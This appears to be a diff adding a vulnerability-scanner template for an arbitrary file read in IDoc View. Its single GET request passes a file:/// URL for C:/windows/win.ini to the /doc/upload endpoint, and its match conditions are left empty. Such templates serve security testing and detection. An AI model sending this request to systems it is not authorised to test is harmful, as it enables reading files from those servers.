@@ -1,0 +1,16 @@
+id: idocview-lfi
+brief:
+    title: IDoc View - Arbitrary File Read
+    by: DhiyaneshDK
+    level: high
+    about: ""
+    label:
+        - idoc
+        - lfi
+        - file-read
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name={{file}}.txt'
+      signs: []
